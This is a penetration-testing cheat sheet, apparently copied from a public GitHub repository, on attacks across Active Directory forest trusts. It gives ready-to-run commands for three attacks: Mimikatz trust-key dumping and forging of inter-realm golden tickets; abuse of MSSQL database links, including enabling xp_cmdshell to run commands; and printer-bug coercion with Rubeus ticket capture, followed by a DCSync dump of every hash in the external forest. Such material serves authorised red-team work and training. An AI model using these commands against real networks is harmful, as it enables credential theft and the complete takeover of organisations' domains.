# Active Directory Cross Forest Attacks

## Cross Forest Attacks

### Trust Tickets

_What is this?: If we have Domain Admin rights on a Domain that has a Bidirectional Trust relationship with another forest we can get the Trust key and forge our own inter-realm TGT._

The access we will have will be limited to what our DA account is configured to have on the other Forest!

#### Using Mimikatz

```text
#Dump the trust key
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

#Forge an inter-realm TGT using the Golden Ticket attack
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<OurDomain> /sid:  
<OurDomainSID> /rc4:<TrustKey> /service:krbtgt /target:<TheTargetDomain> /ticket:
<PathToSaveTheGoldenTicket>"'
```

**Tickets -&gt; .kirbi format**

Then ask for a TGS to the external Forest for any service using the inter-realm TGT and access the resource.

Using Rubeus:

```text
.\Rubeus.exe asktgs /ticket:<kirbi file> /service:"Service's SPN" /ptt
```

### Abuse MSSQL Servers

* Enumerate MSSQL Instances: `Get-SQLInstanceDomain`
* Check Accessibility as current user: 

```text
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```

* Gather Information about the instance: `Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose`
* Abusing SQL Database Links: 

_What is this?: A database link allows a SQL Server to access other resources like other SQL Server. If we have two linked SQL Servers we can execute stored procedures in them. Database links also work across Forest Trust!_

Check for existing Database Links:

```text
#PowerUpSQL:
Get-SQLServerLink -Instace <SPN> -Verbose

#MSSQL Query:
select * from master..sysservers
```

Then we can use queries to enumerate other links from the linked Database:

```text
#Manualy:
select * from openquery("LinkedDatabase", 'select * from master..sysservers')

#PowerUpSQL (Will Enum every link across Forests and Child Domain of the Forests):
Get-SQLServerLinkCrawl -Instance <SPN> -Verbose

#Then we can execute command on the machine's were the SQL Service runs using xp_cmdshell
#Or if it is disabled enable it:
EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "SPN"
```

Query execution:

```text
Get-SQLServerLinkCrawl -Instace <SPN> -Query "exec master..xp_cmdshell 'whoami'"
```

### Breaking Forest Trusts

_What is this?:  TL;DR  If we have a bidirectional trust with an external forest and we manage to compromise a machine on the local forest that has enabled unconstrained delegation \(DCs have this by default\), we can use the printer bug to force the DC of the external forest's root domain to authenticate to us. Then we can capture its TGT, inject it into memory, and DCsync to dump its hashes, giving us complete access over the whole forest._

Some tools that we can use are:

* [Rubeus](https://github.com/GhostPack/Rubeus)
* [SpoolSample](https://github.com/leechristensen/SpoolSample)
* [Mimikatz](https://github.com/gentilkiwi/mimikatz)

#### Exploitation example

Start monitoring for TGTs with Rubeus:

```text
Rubeus.exe monitor /interval:5 /filteruser:target-dc$
```

Execute the printer bug to trigger the force authentication of the target DC to our machine

```text
SpoolSample.exe target-dc$.external.forest.local dc.compromised.domain.local
```

Get the base64 captured TGT from Rubeus and inject it into memory:

```text
Rubeus.exe ptt /ticket:<Base64ValueofCapturedTicket>
```

Dump the hashes of the target domain using Mimikatz:

```text
lsadump::dcsync /domain:external.forest.local /all
```

Detailed Articles:

* [Not A Security Boundary: Breaking Forest Trusts](https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/)
* [Hunting in Active Directory: Unconstrained Delegation & Forests Trusts](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)

## References

This page content was extracted from here:

{% embed url="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet/blob/master/README.md\#domain-persistence" %}



